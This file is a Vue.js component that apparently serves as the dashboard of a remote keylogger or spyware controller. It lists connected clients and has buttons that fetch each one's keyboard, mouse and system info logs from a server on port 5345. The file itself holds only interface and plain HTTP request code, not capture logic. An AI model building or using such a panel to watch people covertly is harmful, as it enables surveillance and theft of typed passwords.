<template>
    <div>
            <div id="accordion" role="tablist" v-if="hasClients">
                <div v-for="client in clients" class="client-container">
                    <div class="card">
                        <div class="card-header" role="tab" :id="'heading-' + client.id" data-toggle="collapse" :href="'#collapse-' + client.id"
                                aria-expanded="false" :aria-controls="'collapse-' + client.id">
                            <h5 class="mb-0">
                                <i class="fa fa-user-secret" :style="client.status ? 'float: left;color: #3aab3a;' : 'float: left;'" aria-hidden="true" style="float: left;"></i>
                                <a>
                                    {{ client.ip }}
                                </a>
                                <span style="float: right">id : {{ client.id }}</span>
                            </h5>
                        </div>

                        <div :id="'collapse-' + client.id" class="collapse" role="tabpanel" :aria-labelledby="'headingOne-' + client.id">
                            <div class="card-body">
                                <div class="container" style="padding: 15px 15px 150px 15px;">
                                    <div class="row">
                                        <!-- Actions -->
                                        <div class="col">
                                            <div class="dropdown" style="margin-top: 1%;">
                                                <button class="btn btn-secondary dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                                    Actions ...
                                                </button>
                                                <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
                                                    <label class="dropdown-item" @click="getMouse(client.id)"><i class="fa fa-mouse-pointer" aria-hidden="true"></i>   Mouse log</label>
                                                    <label class="dropdown-item" @click="getKey(client.id)"><i class="fa fa-keyboard-o" aria-hidden="true"></i>   Keyboard log</label>
                                                    <label class="dropdown-item"  @click="getInfo(client.id)"><i class="fa fa-terminal" aria-hidden="true"></i>    Info log</label>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
            </div>
        </div>
    </div>
</template>

<script>
    export default {
        name: 'SpiderClientsInfos',
        props: [ 'serverAddr' ],
        data () {
            return {
                clients: [],
                index: 0
            }
        },
        mounted () {
            // Set intervall for ping pong here
            this.addClient();
        },
        methods: {
            addClient() {
                this.$http.get('http://' + this.serverAddr + ':5345/nb').then((response) =>
                    response.json()).then(json => {
                    this.index = json.nbClients;
                    console.log('success ', json);
                    for (let i = 0; i < this.index; i++) {
                        this.clients.push({ip: "10.10.10.10", id: i, status: false});
                    }
                }, (response) => {
                    this.index = 0;
                    console.log('failed', response);
                });
            },
            hasClients() {
                return this.clients.length > 0;
            },
            getInfo(id) {
                this.$http.get('http://' + this.serverAddr + ':5345/getInfo/' + id).then((response) =>
                {
                    console.log('succes', response);
                }, (response) => {
                    console.log('failed', response);
                });
            },
            getKey(id) {
                this.$http.get('http://' + this.serverAddr + ':5345/keyboard/' + id).then((response) =>
                {
                    console.log('succes', response);
                }, (response) => {
                    console.log('failed', response);
                });
            },
            getMouse(id) {
                this.$http.get('http://' + this.serverAddr + ':5345/mouse/' + id).then((response) =>
                {
                    console.log('succes', response);
                }, (response) => {
                    console.log('failed', response);
                });
            }
        }
    }
</script>

<style>
    .pointer-cursor:hover {
        cursor: pointer;
    }
    .dropdown-container {
    position: relative;
    }
    .dropdown-menu {
    position: absolute;
    top: 100%; /* Bottom of button */
    right: 0;
    /* margin-left: -100px; More to the left */
    }
    .card-header:hover {
        cursor: pointer;
    }
    .client-container {
        margin: auto;
        width: 80%;
        padding: 5px 0 5px 0;
    }
    a:hover, a:visited, a:link, a:active
    {
        text-decoration: none;
        color: inherit;
    }
</style>
